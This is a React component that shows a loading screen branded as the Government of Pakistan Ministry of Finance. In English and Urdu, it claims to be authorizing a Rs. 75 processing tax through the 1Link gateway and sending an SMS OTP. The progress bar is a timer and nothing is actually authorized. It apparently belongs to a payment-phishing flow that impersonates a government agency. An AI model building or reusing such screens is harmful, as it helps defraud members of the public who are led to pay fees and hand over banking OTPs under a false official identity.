import React, { useEffect, useState } from 'react';
import { Language } from '../../types';
import { Clock } from 'lucide-react';

interface Step1LinkLoadingProps {
  language: Language;
  onComplete: () => void;
}

export const Step1LinkLoading: React.FC<Step1LinkLoadingProps> = ({
  language,
  onComplete,
}) => {
  const [progress, setProgress] = useState<number>(20);

  useEffect(() => {
    const timer = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(timer);
          setTimeout(onComplete, 400);
          return 100;
        }
        return prev + 25;
      });
    }, 250);

    return () => clearInterval(timer);
  }, [onComplete]);

  return (
    <div className="max-w-xl mx-auto px-4 py-12 animate-in fade-in duration-300">
      <div className="bg-white rounded-3xl shadow-xl border border-emerald-100 p-8 text-center space-y-6">
        <div className="text-left">
          <div className="text-[10px] uppercase font-bold text-emerald-800 tracking-wider">
            GOVERNMENT OF PAKISTAN • MINISTRY OF FINANCE
          </div>
          <h2 className="text-xl font-black text-gray-900 mt-0.5">Searching...</h2>
        </div>

        <div className="w-20 h-20 bg-emerald-50 rounded-full mx-auto flex items-center justify-center text-emerald-700 border border-emerald-200 shadow-inner">
          <Clock className="w-10 h-10 animate-spin text-emerald-700" style={{ animationDuration: '3s' }} />
        </div>

        <div className="space-y-2">
          <h3 className="text-2xl font-black text-gray-900">
            {language === 'en' ? 'Searching 1Link Gateway & Authorizing Fee...' : 'ون لنک گیٹ وے اور فیس کی منظوری...'}
          </h3>
          <p className="text-sm text-gray-600 max-w-md mx-auto">
            {language === 'en'
              ? 'Authorizing Rs. 75 processing tax and dispatching secure SMS OTP'
              : '75 روپے کی پروسیسنگ فیس منظور کی جا رہی ہے اور ایس ایم ایس او ٹی پی بھیجا جا رہا ہے'}
          </p>
          <p className="text-xs text-emerald-800 font-medium pt-2">
            75 روپے کی پروسیسنگ فیس منظور کی جا رہی ہے اور ایس ایم ایس او ٹی پی بھیجا جا رہا ہے
          </p>
        </div>

        {/* Progress bar */}
        <div className="w-full bg-gray-200 h-2.5 rounded-full overflow-hidden">
          <div
            className="bg-[#092217] h-full transition-all duration-300 rounded-full"
            style={{ width: `${progress}%` }}
          ></div>
        </div>

        <div className="text-[11px] text-gray-400 font-medium">
          Government of Pakistan Secure Gateway
        </div>
      </div>
    </div>
  );
};
